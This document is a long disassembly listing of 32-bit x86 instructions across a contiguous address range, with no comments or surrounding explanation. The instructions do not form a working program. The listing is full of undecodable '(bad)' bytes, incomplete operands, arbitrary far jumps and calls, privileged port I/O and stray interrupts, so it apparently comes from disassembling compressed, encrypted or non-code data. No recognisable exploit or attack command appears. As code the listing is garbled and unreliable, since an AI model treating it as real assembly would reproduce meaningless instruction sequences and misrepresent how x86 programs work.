  423750:	mov    ?,WORD PTR [edi]
  423752:	xchg   ebx,eax
  423753:	push   cs
  423754:	rcl    DWORD PTR [ecx-0x3cfa57a8],cl
  42375a:	sar    BYTE PTR [eax+ebx*4-0x325f10c],0x2a
  423762:	mov    ds:0x7f129c20,eax
  423767:	scas   eax,DWORD PTR es:[edi]
  423768:	pushf  
  423769:	xlat   BYTE PTR ds:[ebx]
  42376a:	shl    BYTE PTR [eax-0x53],0x41
  42376e:	(bad)  
  42376f:	dec    edx
  423770:	stos   BYTE PTR es:[edi],al
  423771:	inc    BYTE PTR [ecx-0x7b]
  423774:	mov    bl,0xc5
  423776:	or     eax,0x123997dd
  42377b:	call   FWORD PTR [eax]
  42377d:	inc    ecx
  42377e:	dec    esi
  42377f:	lods   al,BYTE PTR ds:[esi]
  423780:	dec    ebp
  423781:	inc    ah
  423783:	or     DWORD PTR [ebx-0x2b58dac],esp
  423789:	mov    eax,ds:0x33d5f476
  42378e:	fcomp  DWORD PTR [ebx]
  423790:	leave  
  423791:	xor    BYTE PTR ds:0x26e202f7,al
  423797:	mov    ebp,0xcd7c780b
  42379c:	lods   eax,DWORD PTR ds:[esi]
  42379d:	ficomp DWORD PTR [ecx]
  42379f:	imul   edi,DWORD PTR [eax+0x46],0x9353583b
  4237a6:	and    eax,esp
  4237a8:	add    eax,0x83b86b61
  4237ad:	ficom  DWORD PTR [edx+0x38580d6]
  4237b3:	rcr    bh,1
  4237b5:	inc    edi
  4237b6:	pop    eax
  4237b7:	mov    esp,DWORD PTR [esp+edi*1+0x2b]
  4237bb:	jle    0x423806
  4237bd:	ja     0x423793
  4237bf:	adc    eax,0x4269fc58
  4237c4:	aaa    
  4237c5:	rol    DWORD PTR [edx-0x34],1
  4237c8:	rcl    DWORD PTR [eax-0x1d1f9739],cl
  4237ce:	mov    ebp,ss
  4237d0:	add    eax,0x32efd775
  4237d5:	(bad)  
  4237d6:	cld    
  4237d7:	outs   dx,BYTE PTR ds:[esi]
  4237d8:	sahf   
  4237d9:	scas   al,BYTE PTR es:[edi]
  4237da:	or     DWORD PTR [esi-0x7efad6a1],0x8
  4237e1:	aad    0x76
  4237e3:	or     al,0x67
  4237e5:	cmp    DWORD PTR [edx-0x47],0xffffff93
  4237e9:	fsubr  st(0),st
  4237eb:	not    dh
  4237ed:	cdq    
  4237ee:	xchg   ecx,eax
  4237ef:	cli    
  4237f0:	addr16 mov dl,0xcd
  4237f3:	sbb    DWORD PTR [ebp+0x21f18206],edi
  4237f9:	dec    edx
  4237fa:	jmp    0xf9a4:0x3ccec106
  423801:	adc    al,BYTE PTR [ebp+0x43]
  423804:	cmovg  ebp,DWORD PTR [edi+ebx*1-0x5b]
  423809:	mov    al,0xf2
  42380b:	jge    0x423881
  42380d:	cmp    DWORD PTR [edx-0x5c70110b],esi
  423813:	adc    DWORD PTR [ebx-0x40],ebx
  423816:	or     BYTE PTR [ebp-0x11],cl
  423819:	bnd jbe 0x4237be
  42381c:	ret    0x769f
  42381f:	aad    0xaa
  423821:	mov    esi,0xa09fe25e
  423826:	inc    ebp
  423827:	dec    ebp
  423828:	repz fisubr WORD PTR [ebp-0x5506d4f0]
  42382f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423830:	pushf  
  423831:	and    DWORD PTR [edi-0x50],ebx
  423834:	jg     0x4237cc
  423836:	or     BYTE PTR [eax+0x50],bl
  423839:	push   es
  42383a:	call   0xc8f2:0x421af0a1
  423841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423842:	addr16 or al,0xfe
  423845:	stmxcsr DWORD PTR [esi+0x164d1c4d]
  42384c:	les    esp,FWORD PTR cs:[esi-0x34]
  423850:	scas   al,BYTE PTR es:[edi]
  423851:	sub    BYTE PTR [edi],cl
  423853:	test   eax,0xfc9beaaa
  423858:	retf   
  423859:	sub    DWORD PTR [esi],ebx
  42385b:	ret    0x24f1
  42385e:	mov    ds:0x3fa9f513,al
  423863:	or     DWORD PTR [edx-0x1b],esi
  423866:	push   ds
  423867:	ret    0x59dd
  42386a:	cld    
  42386b:	pop    ecx
  42386c:	sbb    al,0xda
  42386e:	psubsw mm2,QWORD PTR [ebx-0x23902202]
  423875:	ret    
  423876:	outs   dx,BYTE PTR ds:[esi]
  423877:	iret   
  423878:	repnz mov eax,ds:0x9dcf1e98
  42387e:	jmp    0x2b26c485
  423883:	sbb    al,0x8c
  423885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423886:	inc    ecx
  423887:	ss jl  0x4238b7
  42388a:	test   al,0xd0
  42388c:	or     eax,DWORD PTR [ecx+ebx*4]
  42388f:	lods   al,BYTE PTR ds:[esi]
  423890:	mov    ds:0x7f625841,eax
  423895:	mov    dh,BYTE PTR [edx]
  423897:	mov    al,0xd2
  423899:	test   eax,0x8a13c63f
  42389e:	fwait
  42389f:	push   ebx
  4238a0:	sbb    esi,DWORD PTR [ebx-0x1f7db011]
  4238a6:	sub    ch,BYTE PTR [ebx+0x2d]
  4238a9:	cs popf 
  4238ab:	xchg   esp,eax
  4238ac:	sti    
  4238ad:	outs   dx,DWORD PTR ds:[esi]
  4238ae:	push   esp
  4238af:	or     dl,ah
  4238b1:	xor    al,0xf5
  4238b3:	or     edx,0xffffffa9
  4238b6:	xchg   ecx,eax
  4238b7:	(bad)  
  4238b8:	pop    ds
  4238b9:	mov    WORD PTR [ecx-0x6f503320],es
  4238bf:	xor    eax,0x18f9c383
  4238c4:	ss addr16 cs das 
  4238c8:	lods   al,BYTE PTR ds:[esi]
  4238c9:	cmp    eax,DWORD PTR [ebp+0x5265dd2d]
  4238cf:	das    
  4238d0:	fidivr DWORD PTR [ebp+0x171f9a1e]
  4238d6:	pop    es
  4238d7:	xchg   ebx,eax
  4238d8:	sbb    bh,cl
  4238da:	xchg   ebp,eax
  4238db:	js     0x42388e
  4238dd:	cmc    
  4238de:	add    al,0x55
  4238e0:	or     bh,BYTE PTR [ecx]
  4238e2:	rol    dl,0xb3
  4238e5:	xor    dl,bl
  4238e7:	xchg   ebx,eax
  4238e8:	adc    DWORD PTR [ecx],esi
  4238ea:	(bad)  
  4238ec:	pop    edi
  4238ed:	push   edx
  4238ee:	sti    
  4238ef:	clc    
  4238f0:	xchg   ecx,eax
  4238f1:	clc    
  4238f2:	lods   al,BYTE PTR ds:[esi]
  4238f3:	push   eax
  4238f4:	cmp    BYTE PTR [ecx+0x28],al
  4238f7:	mov    al,0x17
  4238f9:	enter  0x7224,0xb6
  4238fd:	out    0xd8,al
  4238ff:	push   esi
  423900:	lahf   
  423901:	pop    esp
  423902:	aaa    
  423903:	cli    
  423904:	add    eax,0x60536f0
  423909:	jb     0x4238df
  42390b:	out    dx,eax
  42390c:	jmp    0x70a7614a
  423911:	inc    eax
  423912:	mov    dl,BYTE PTR [ecx+edx*2]
  423915:	mov    bh,0x3e
  423917:	push   ss
  423918:	sti    
  423919:	pop    es
  42391a:	inc    edx
  42391b:	out    dx,al
  42391c:	into   
  42391d:	dec    esi
  42391e:	aas    
  42391f:	inc    esp
  423920:	dec    esp
  423921:	out    0x42,eax
  423923:	cmp    DWORD PTR [ecx-0x75],0x6715c3fd
  42392a:	imul   edi,DWORD PTR [ebx-0x13ad1df0],0x36ec8589
  423934:	shr    BYTE PTR [eax+0x51],1
  423937:	dec    ecx
  423938:	scas   al,BYTE PTR es:[edi]
  423939:	fnstcw WORD PTR [ebp+0x19]
  42393c:	jnp    0x4238f2
  42393e:	fst    QWORD PTR [edi+0x74]
  423941:	ins    BYTE PTR es:[edi],dx
  423942:	and    BYTE PTR [ebx+ebx*2-0xb],dl
  423946:	mov    ch,bh
  423948:	sbb    ebx,DWORD PTR [edi+0xd]
  42394b:	fisubr DWORD PTR [esp+esi*2-0x24880b27]
  423952:	cmc    
  423953:	inc    esp
  423954:	cmp    eax,0xc5db1a7e
  423959:	push   ds
  42395a:	xor    esp,ebx
  42395c:	arpl   WORD PTR [ebx-0xd],bp
  42395f:	mov    cl,0x4
  423961:	loope  0x423973
  423963:	and    eax,0x73b83cb0
  423968:	cwde   
  423969:	mov    dh,0x5f
  42396b:	out    0xc,al
  42396d:	adc    DWORD PTR es:[edx+0xb],ebp
  423971:	lahf   
  423972:	int    0x0
  423974:	(bad)  
  423975:	es in  eax,0x90
  423978:	pusha  
  423979:	iret   
  42397a:	jae    0x4239f9
  42397c:	retf   
  42397d:	inc    ebx
  42397e:	lock arpl WORD PTR [eax+0x38],dx
  423982:	mov    esi,edi
  423984:	or     al,0x9
  423986:	push   0x2b
  423988:	and    BYTE PTR [eax+0x2eb23f7f],cl
  42398e:	adc    eax,0x9b9f9952
  423993:	jmp    0xcefb:0xc3f3695e
  42399a:	lods   eax,DWORD PTR ds:[esi]
  42399b:	mov    cs:0x14139ac5,al
  4239a1:	(bad)  
  4239a2:	jb     0x4239bb
  4239a4:	inc    eax
  4239a5:	adc    al,0x69
  4239a7:	mov    dh,0x1d
  4239a9:	jmp    0x1e148a8f
  4239ae:	(bad)  
  4239af:	xor    DWORD PTR fs:[eax-0x1f71896],esi
  4239b6:	les    ebx,FWORD PTR [esi]
  4239b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239b9:	int    0x19
  4239bb:	cld    
  4239bc:	push   ebx
  4239bd:	gs or  al,0x4f
  4239c0:	mov    dl,0xbc
  4239c2:	mov    ebx,0x5f7e4a2d
  4239c7:	push   cs
  4239c8:	cmc    
  4239c9:	add    eax,0x6be7ace0
  4239ce:	repz fidiv WORD PTR cs:[ebx+0x774a0e85]
  4239d6:	imul   ebx,DWORD PTR [esi-0x752f538f],0xffffffd5
  4239dd:	push   esp
  4239de:	sbb    eax,0x33a1636f
  4239e3:	cmc    
  4239e4:	imul   esi,DWORD PTR [esi-0x1f982d8b],0xdacb0cce
  4239ee:	(bad)  
  4239ef:	xchg   edx,eax
  4239f0:	push   edi
  4239f1:	pop    ebp
  4239f2:	std    
  4239f3:	xchg   ebx,eax
  4239f4:	(bad)  
  4239f6:	add    eax,DWORD PTR [eax+ecx*2]
  4239f9:	jae    0x423a04
  4239fb:	imul   ebp,DWORD PTR ds:0x0,0x0
  423a02:	inc    esi
  423a03:	xchg   edi,eax
  423a04:	daa    
  423a05:	cmp    esi,edi
  423a07:	mov    ebx,0x9b53ff5e
  423a0c:	and    ebx,DWORD PTR [ebp+0x1541d5d8]
  423a12:	xor    BYTE PTR [ebx+0x4f30001],dh
  423a18:	add    BYTE PTR [eax],al
  423a1a:	cdq    
  423a1b:	and    eax,0x1643703f
  423a20:	mov    esi,0xa8f300f4
  423a25:	sub    al,0xa
  423a27:	mov    ds:0x75b859b6,eax
  423a2c:	mov    cs,WORD PTR [eax-0x1a9ee04d]
  423a32:	xchg   ebp,eax
  423a33:	jbe    0x423a87
  423a35:	(bad)  
  423a36:	out    0xa6,al
  423a38:	(bad)  
  423a39:	call   0x75590ac5
  423a3e:	in     al,dx
  423a3f:	call   0x6497:0x43a623df
  423a46:	adc    BYTE PTR [esi-0x6a0d48b6],ch
  423a4c:	mov    al,0xe8
  423a4e:	adc    al,0x99
  423a50:	or     eax,edi
  423a52:	sbb    esp,DWORD PTR [edi-0x2756af0c]
  423a58:	inc    bl
  423a5a:	mov    ah,0xd
  423a5c:	mov    al,ds:0x564124ce
  423a61:	popf   
  423a62:	mov    edi,ecx
  423a64:	out    0x53,eax
  423a66:	pushf  
  423a67:	je     0x423ac3
  423a69:	jmp    FWORD PTR [ebx+0x74]
  423a6c:	mov    si,0x243b
  423a70:	xchg   dl,bl
  423a72:	mov    WORD PTR [edx+0x5a373940],ss
  423a78:	lds    ecx,FWORD PTR [ebp+0x73]
  423a7b:	jno    0x423aed
  423a7d:	sbb    bl,bh
  423a7f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423a81:	hlt    
  423a82:	inc    edx
  423a83:	push   edx
  423a84:	outs   dx,DWORD PTR ds:[esi]
  423a85:	jecxz  0x423a6e
  423a87:	push   ss
  423a88:	pop    ebx
  423a89:	ja     0x423aa2
  423a8b:	inc    ebx
  423a8c:	pushf  
  423a8d:	rcl    bl,0x7e
  423a90:	hlt    
  423a91:	in     al,dx
  423a92:	mov    bl,BYTE PTR [edx-0x52]
  423a95:	mov    bh,BYTE PTR ds:0x6252bbf2
  423a9b:	jns    0x423af7
  423a9d:	mov    ds:0xa6d25eef,eax
  423aa2:	mov    DWORD PTR [ecx+edx*8+0x76e48adc],ebp
  423aa9:	xor    eax,0x8e96c5a6
  423aae:	xchg   esi,eax
  423aaf:	push   edi
  423ab0:	sbb    bl,0x5b
  423ab3:	mov    dl,0xe7
  423ab5:	sbb    DWORD PTR [ebx-0x52e06a61],ebx
  423abb:	fld    QWORD PTR ss:[ecx]
  423abe:	jb     0x423b07
  423ac0:	clc    
  423ac1:	stos   DWORD PTR es:[edi],eax
  423ac2:	cwde   
  423ac3:	mov    ds:0x6bd7ba3c,al
  423ac8:	mov    eax,ds:0x8c1d4bc9
  423acd:	xchg   edi,eax
  423ace:	xor    ch,bl
  423ad0:	das    
  423ad1:	je     0x423b2b
  423ad3:	sti    
  423ad4:	(bad)  
  423ad5:	cmp    eax,0x7ecc9494
  423ada:	xchg   ebp,eax
  423adb:	pushf  
  423adc:	xchg   esp,eax
  423add:	popf   
  423ade:	and    BYTE PTR ds:0x20777941,bl
  423ae4:	add    edx,DWORD PTR [esi]
  423ae6:	pop    ds
  423ae7:	imul   ecx,DWORD PTR [eax],0x42
  423aea:	xlat   BYTE PTR ds:[ebx]
  423aeb:	push   eax
  423aec:	or     ebp,DWORD PTR [edx-0x2a44e365]
  423af2:	jecxz  0x423b31
  423af4:	or     ebx,DWORD PTR [esi]
  423af6:	imul   ecx
  423af8:	stos   BYTE PTR es:[edi],al
  423af9:	(bad)  
  423afa:	sub    eax,0x3509bb77
  423aff:	sub    bl,dl
  423b01:	in     al,dx
  423b02:	jo     0x423b65
  423b04:	xchg   edi,eax
  423b05:	inc    ebp
  423b06:	jmp    0xecf1:0x93de3fd
  423b0d:	cs jne 0x423b69
  423b10:	or     ah,dh
  423b12:	add    DWORD PTR [edi],ebx
  423b14:	out    0x5,eax
  423b16:	inc    ebp
  423b17:	mov    DWORD PTR [edi],ebx
  423b19:	int3   
  423b1a:	pop    esp
  423b1b:	and    DWORD PTR [edx],0x2a
  423b1e:	dec    edx
  423b1f:	pop    ebx
  423b20:	lock stos BYTE PTR es:[edi],al
  423b22:	and    eax,0x63a79f8
  423b27:	inc    eax
  423b28:	pop    edx
  423b29:	fldcw  WORD PTR [edx+0x4c2a77a8]
  423b2f:	test   eax,0x209c8960
  423b34:	xor    DWORD PTR [eax+ebx*2+0x31a34028],edx
  423b3b:	mov    eax,ds:0xf823988a
  423b40:	sub    DWORD PTR [eax-0x3d83b28e],eax
  423b46:	ret    
  423b47:	mov    bl,0x99
  423b49:	pop    esp
  423b4a:	inc    ebx
  423b4b:	fstp   DWORD PTR [ebp-0xf]
  423b4e:	rcl    BYTE PTR [eax],cl
  423b50:	lods   al,BYTE PTR ds:[esi]
  423b51:	cmp    ebx,esp
  423b53:	jae    0x423b2c
  423b55:	jl     0x423b24
  423b57:	cld    
  423b58:	jae    0x423ba4
  423b5a:	push   edx
  423b5b:	aas    
  423b5c:	pop    esp
  423b5d:	call   0xb436:0x4314d937
  423b64:	push   edx
  423b65:	(bad)  
  423b66:	add    eax,DWORD PTR [esp+edi*2]
  423b69:	pop    esp
  423b6a:	push   esp
  423b6b:	cli    
  423b6c:	loopne 0x423bdf
  423b6e:	cld    
  423b6f:	std    
  423b70:	sub    al,0x75
  423b72:	into   
  423b73:	sbb    ah,BYTE PTR [esi-0x71fe359d]
  423b79:	jbe    0x423ba2
  423b7b:	mov    ch,0x2c
  423b7d:	stos   BYTE PTR es:[edi],al
  423b7e:	icebp  
  423b7f:	rcr    DWORD PTR [eax+0x3b],0x36
  423b83:	push   ebp
  423b84:	inc    esp
  423b85:	aas    
  423b86:	mov    bh,0xa6
  423b88:	mov    ebx,0xe085cc62
  423b8d:	ret    
  423b8e:	push   cs
  423b8f:	ins    BYTE PTR es:[edi],dx
  423b90:	lods   eax,DWORD PTR es:[esi]
  423b92:	cli    
  423b93:	rcr    DWORD PTR ds:0x139f7a60,1
  423b99:	out    0x24,al
  423b9b:	std    
  423b9c:	repnz fmul DWORD PTR [edi+0x20]
  423ba0:	pop    edx
  423ba1:	in     eax,dx
  423ba2:	clc    
  423ba3:	loop   0x423bb8
  423ba5:	punpckhwd mm5,QWORD PTR [edx-0x74]
  423ba9:	les    edx,FWORD PTR [ebx+ecx*8]
  423bac:	ins    DWORD PTR es:[edi],dx
  423bad:	sbb    BYTE PTR [ebp+ebx*2+0x45b6becc],bh
  423bb4:	and    ah,BYTE PTR [edx-0x2d]
  423bb7:	jg     0x423bfa
  423bb9:	xor    al,0x6e
  423bbb:	inc    edx
  423bbc:	mov    ah,0xe5
  423bbe:	xor    eax,0x2d298282
  423bc3:	je     0x423bf4
  423bc5:	arpl   WORD PTR [ecx-0x53],ax
  423bc8:	push   ebp
  423bc9:	enter  0x8324,0x85
  423bcd:	pop    ecx
  423bce:	imul   esp,edx,0x831483a
  423bd4:	sbb    dh,ch
  423bd6:	sbb    al,0xa1
  423bd8:	clc    
  423bd9:	mov    ebp,0xe5929358
  423bde:	jae    0x423c29
  423be0:	ja     0x423bd2
  423be2:	cmp    DWORD PTR [ebx-0x5306c40f],ecx
  423be8:	daa    
  423be9:	dec    ebx
  423bea:	(bad)  
  423beb:	arpl   WORD PTR [eax-0x8ac984d],dx
  423bf1:	push   eax
  423bf2:	sub    DWORD PTR [ecx+0x31],ecx
  423bf5:	and    eax,0x7b903448
  423bfa:	aaa    
  423bfb:	pop    edx
  423bfc:	or     ch,BYTE PTR [eax+eax*4+0x20]
  423c00:	inc    edi
  423c01:	les    esp,FWORD PTR [ecx-0xa]
  423c04:	dec    eax
  423c05:	xchg   ebx,edi
  423c07:	and    esp,DWORD PTR [edi+0x49]
  423c0a:	push   eax
  423c0b:	(bad)  
  423c0c:	fidivr WORD PTR [ecx-0x2e68998b]
  423c12:	(bad)  
  423c13:	test   al,0x6c
  423c15:	xchg   bh,dh
  423c17:	dec    eax
  423c18:	bound  ebx,QWORD PTR [eax+0x341a51cc]
  423c1e:	mov    DWORD PTR [ebp+0x14],esp
  423c21:	xor    bl,bh
  423c23:	(bad)  
  423c24:	std    
  423c25:	adc    eax,0x6a356c5d
  423c2a:	or     BYTE PTR [eax+0x3b],ah
  423c2d:	lods   eax,DWORD PTR ds:[esi]
  423c2e:	dec    ebx
  423c2f:	out    0xc6,al
  423c31:	push   edi
  423c32:	dec    edx
  423c33:	pop    es
  423c34:	sub    BYTE PTR [edi-0x6a],al
  423c37:	in     al,dx
  423c38:	div    BYTE PTR [esi-0x4346d1bc]
  423c3e:	and    eax,0x5addb64e
  423c43:	fsub   st,st(4)
  423c45:	sbb    al,0x34
  423c47:	je     0x423c88
  423c49:	mov    ds:0x8bbd421c,al
  423c4e:	aas    
  423c4f:	push   esp
  423c50:	mov    ebx,0xe79ca14
  423c55:	loopne 0x423c7f
  423c57:	add    bh,BYTE PTR [edx]
  423c59:	ins    BYTE PTR es:[edi],dx
  423c5a:	fistp  QWORD PTR [eax+0x47]
  423c5d:	adc    eax,0xdefd0049
  423c62:	daa    
  423c63:	in     eax,0x2e
  423c65:	pop    ebp
  423c66:	js     0x423c4a
  423c68:	or     esi,0x3a5c02bf
  423c6e:	mov    ch,0x2f
  423c70:	es inc ebp
  423c72:	xlat   BYTE PTR ds:[ebx]
  423c73:	pop    edx
  423c74:	cs mov ch,0x7e
  423c77:	daa    
  423c78:	xor    dl,al
  423c7a:	inc    eax
  423c7b:	xchg   esp,eax
  423c7c:	add    edx,DWORD PTR [eax-0x23327f51]
  423c82:	jecxz  0x423cb1
  423c84:	pop    edi
  423c85:	jo     0x423c6b
  423c87:	add    ebx,ebx
  423c89:	fwait
  423c8a:	loope  0x423cb2
  423c8c:	arpl   sp,sp
  423c8e:	pop    ebx
  423c8f:	adc    eax,0x7cdcb6ce
  423c94:	push   ebp
  423c95:	sbb    BYTE PTR [ebp-0x56],0xbd
  423c99:	aam    0x62
  423c9b:	or     BYTE PTR [eax],bl
  423c9d:	jmp    0xd4ffde30
  423ca2:	xchg   ecx,eax
  423ca3:	cmp    ecx,DWORD PTR [esi-0x467eaa69]
  423ca9:	in     al,dx
  423caa:	dec    esp
  423cab:	test   al,0xc4
  423cad:	clc    
  423cae:	cmp    BYTE PTR [edi+0x2102f8c9],al
  423cb4:	mov    dh,0x5c
  423cb6:	lock push esi
  423cb8:	outs   dx,BYTE PTR ds:[esi]
  423cb9:	ret    
  423cba:	sahf   
  423cbb:	jb     0x423cf8
  423cbd:	lods   al,BYTE PTR ds:[esi]
  423cbe:	or     DWORD PTR [ecx-0x7c8ab86f],edx
  423cc4:	repz mov WORD PTR [esi],fs
  423cc7:	cli    
  423cc8:	popf   
  423cc9:	xor    eax,0x1b674713
  423cce:	mov    al,0x54
  423cd0:	lock pop edi
  423cd2:	or     ebx,ebx
  423cd4:	stos   DWORD PTR es:[edi],eax
  423cd5:	jmp    0x423cc7
  423cd7:	xchg   esi,eax
  423cd8:	mov    cs,WORD PTR [edx-0x29]
  423cdb:	jnp    0x423d58
  423cdd:	(bad)  
  423cde:	div    DWORD PTR [ebx-0x32dd6334]
  423ce4:	in     al,0x8
  423ce6:	pop    edx
  423ce7:	pop    esp
  423ce8:	jp     0x423ce4
  423cea:	or     DWORD PTR [ebx+0x6d],0xc
  423cee:	inc    ebx
  423cef:	mov    eax,ebp
  423cf1:	in     al,0xd6
  423cf3:	leave  
  423cf4:	mov    edi,0xf2d5d5f2
  423cf9:	cs enter 0xe939,0x72
  423cfe:	push   edi
  423cff:	fdiv   QWORD PTR [edx]
  423d01:	lds    edi,FWORD PTR [ebx+0x2e]
  423d04:	pop    edi
  423d05:	mov    edi,0xa352d1c5
  423d0a:	pop    edx
  423d0b:	ss push edi
  423d0d:	mov    al,bl
  423d0f:	mov    ebx,0x4316b323
  423d14:	ja     0x423c9c
  423d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d17:	cs add eax,0x99dc322a
  423d1d:	js     0x423d66
  423d1f:	sub    al,0x57
  423d21:	push   ecx
  423d22:	xor    al,BYTE PTR [ebx-0x3d]
  423d25:	mov    edx,edi
  423d27:	xlat   BYTE PTR ds:[ebx]
  423d28:	fnstenv [esi]
  423d2a:	push   edi
  423d2b:	or     DWORD PTR [edi+0x20d926a0],eax
  423d31:	ins    DWORD PTR es:[edi],dx
  423d32:	and    DWORD PTR [ebx+ebp*4-0x7d6b360],ebp
  423d39:	popf   
  423d3a:	jmp    0x423d3b
  423d3c:	outs   dx,DWORD PTR ds:[esi]
  423d3d:	adc    DWORD PTR [esi],0xffffffae
  423d40:	mov    ebp,0xd35ca096
  423d45:	jmp    0xcdf14794
  423d4a:	test   bl,bl
  423d4c:	and    eax,DWORD PTR [esi]
  423d4e:	or     al,0xea
  423d50:	repz repz retf 0x2a26
  423d55:	mov    dh,ch
  423d57:	add    esp,DWORD PTR [ecx+eiz*8]
  423d5a:	or     ah,BYTE PTR [edi+0x47]
  423d5d:	es cmp al,ah
  423d60:	inc    ebx
  423d61:	(bad)  
  423d62:	loopne 0x423dc0
  423d64:	mov    dh,0x72
  423d66:	sti    
  423d67:	push   ebp
  423d68:	dec    edx
  423d69:	mov    al,0xdb
  423d6b:	pop    esi
  423d6c:	in     eax,0x60
  423d6e:	push   0x73
  423d70:	cmp    DWORD PTR [ecx],eax
  423d72:	sbb    edx,DWORD PTR [ebp-0x1e]
  423d75:	ror    al,0x4b
  423d78:	xor    BYTE PTR [esi+0x77],0xa
  423d7c:	and    edi,DWORD PTR [ecx-0x7c4678f9]
  423d82:	mov    al,0xc5
  423d84:	adc    BYTE PTR [ecx+0x1bd75c41],bh
  423d8a:	jo     0x423d68
  423d8c:	daa    
  423d8d:	out    0x9f,al
  423d8f:	test   DWORD PTR [ecx+0x23],edi
  423d92:	repz pop ebx
  423d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d95:	outs   dx,DWORD PTR ds:[esi]
  423d96:	pop    edx
  423d97:	inc    edx
  423d98:	sub    eax,0xb7e9c8b7
  423d9d:	aaa    
  423d9e:	loope  0x423d22
  423da0:	loopne 0x423d87
  423da2:	sub    ch,BYTE PTR [esi+0x4d]
  423da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da6:	jmp    0x423dc4
  423da8:	push   ds
  423da9:	mov    ebp,0x72b173af
  423dae:	test   eax,0x9ed58ae2
  423db3:	mov    ?,eax
  423db5:	pop    ecx
  423db6:	pop    eax
  423db7:	(bad)  
  423db8:	xchg   edx,eax
  423db9:	dec    eax
  423dba:	jg     0x423e1a
  423dbc:	pop    es
  423dbd:	mov    al,0x42
  423dbf:	aaa    
  423dc0:	mov    ch,0xa7
  423dc2:	xchg   ah,ah
  423dc4:	ds add al,0x18
  423dc7:	mov    al,0x70
  423dc9:	fisttp DWORD PTR [ecx-0x4b]
  423dcc:	mov    eax,ds:0xbd161b6d
  423dd1:	inc    edx
  423dd2:	dec    eax
  423dd3:	push   cs
  423dd4:	stos   DWORD PTR es:[edi],eax
  423dd5:	jmp    0xc142:0xe46008df
  423ddc:	xor    ch,BYTE PTR [eax]
  423dde:	dec    ebp
  423ddf:	sub    al,0xb5
  423de1:	nop
  423de2:	shr    BYTE PTR [ebp+0x7d2df35],1
  423de8:	jo     0x423daa
  423dea:	pop    eax
  423deb:	pop    ecx
  423dec:	fcmovu st,st(4)
  423dee:	jecxz  0x423db7
  423df0:	jbe    0x423e18
  423df2:	imul   ebp,DWORD PTR [eax],0xffffffad
  423df5:	dec    ebp
  423df6:	push   ecx
  423df7:	ins    BYTE PTR es:[edi],dx
  423df8:	inc    eax
  423df9:	jge    0x423e75
  423dfb:	mov    cs,WORD PTR [esp+edx*8+0xba2d74a]
  423e02:	xchg   esi,eax
  423e03:	sar    eax,0x23
  423e06:	fimul  WORD PTR [ebx]
  423e08:	sub    eax,0x4fbe252b
  423e0d:	mov    ebp,0x648b15cd
  423e12:	(bad)  
  423e14:	(bad)  
  423e15:	pop    esi
  423e16:	add    DWORD PTR [edx],esp
  423e18:	pop    ds
  423e19:	sar    DWORD PTR [edi+0x3],cl
  423e1c:	pop    esp
  423e1d:	in     eax,0x32
  423e1f:	mul    bh
  423e21:	cmc    
  423e22:	push   ebx
  423e23:	sub    ebp,DWORD PTR [edx]
  423e25:	xor    BYTE PTR [edx-0x7b6682a9],dh
  423e2b:	cmp    al,0xcc
  423e2d:	fcmove st,st(1)
  423e2f:	cld    
  423e30:	out    0x5c,eax
  423e32:	adc    BYTE PTR [edi+0x77db93fb],bl
  423e38:	in     al,dx
  423e39:	cmp    al,0x12
  423e3b:	dec    edi
  423e3c:	ja     0x423de5
  423e3e:	jnp    0x423e83
  423e40:	jg     0x423e59
  423e42:	jge    0x423e73
  423e44:	popf   
  423e45:	aas    
  423e46:	imul   esi,DWORD PTR [eax-0x31],0x15965efc
  423e4d:	sub    ecx,DWORD PTR [eax]
  423e4f:	gs mov dh,BYTE PTR fs:[edx]
  423e53:	dec    esp
  423e54:	in     al,dx
  423e55:	mov    ds:0xbbeb5e1d,al
  423e5a:	mov    ah,BYTE PTR [ebp+0x7818271f]
  423e60:	int    0x65
  423e62:	sub    DWORD PTR [edx+0x75],eax
  423e65:	sahf   
  423e66:	adc    al,0x6
  423e68:	inc    ecx
  423e69:	sub    DWORD PTR [ebp-0x43],ebx
  423e6c:	jo     0x423e3f
  423e6e:	cld    
  423e6f:	cmp    BYTE PTR [esi-0x9930dd6],bh
  423e75:	jge    0x423e19
  423e77:	ss stos BYTE PTR es:[edi],al
  423e79:	enter  0x58d9,0xf9
  423e7d:	mov    esp,0x82a80b36
  423e82:	div    BYTE PTR [edx+0x39]
  423e85:	mov    edi,0xca3a8289
  423e8a:	xor    eax,0xa1e59794
  423e8f:	cmp    DWORD PTR [edi+0x3045080e],esi
  423e95:	push   eax
  423e96:	fild   DWORD PTR [ebp-0x45]
  423e99:	jmp    0x26c8:0xc175ff63
  423ea0:	dec    edx
  423ea1:	sar    BYTE PTR [ecx-0x57],0x7
  423ea5:	rcr    DWORD PTR [ebx+0x4e5e9858],cl
  423eab:	jne    0x423e7e
  423ead:	lea    ecx,[edi-0x30]
  423eb0:	scas   al,BYTE PTR es:[edi]
  423eb1:	sbb    eax,0x8959f789
  423eb6:	push   cs
  423eb7:	or     bl,BYTE PTR [ecx-0x2e]
  423eba:	nop
  423ebb:	into   
  423ebc:	push   ss
  423ebd:	xchg   edx,eax
  423ebe:	cld    
  423ebf:	xor    dh,BYTE PTR [ebp-0x27]
  423ec2:	adc    DWORD PTR [edx-0x5b03e596],0xffffffda
  423ec9:	mul    DWORD PTR [edi+0x6ee3bb29]
  423ecf:	retf   
  423ed0:	je     0x423e6a
  423ed2:	scas   eax,DWORD PTR es:[edi]
  423ed3:	xchg   DWORD PTR [edi+0x79f5dedf],esi
  423ed9:	xor    eax,0xb32267aa
  423ede:	push   eax
  423edf:	nop
  423ee0:	add    dl,al
  423ee2:	lock jne 0x423f28
  423ee5:	xor    edi,DWORD PTR [esi]
  423ee7:	(bad)  
  423ee8:	push   ss
  423ee9:	pop    ss
  423eea:	add    ecx,0xc
  423eed:	arpl   WORD PTR [ebp-0x71],di
  423ef0:	adc    al,0xba
  423ef2:	mov    ebp,0xf3e4813c
  423ef7:	loopne 0x423f68
  423ef9:	mov    DWORD PTR [esi+0x292a2720],0xd5c08288
  423f03:	std    
  423f04:	or     al,BYTE PTR [edi]
  423f06:	push   ss
  423f07:	aaa    
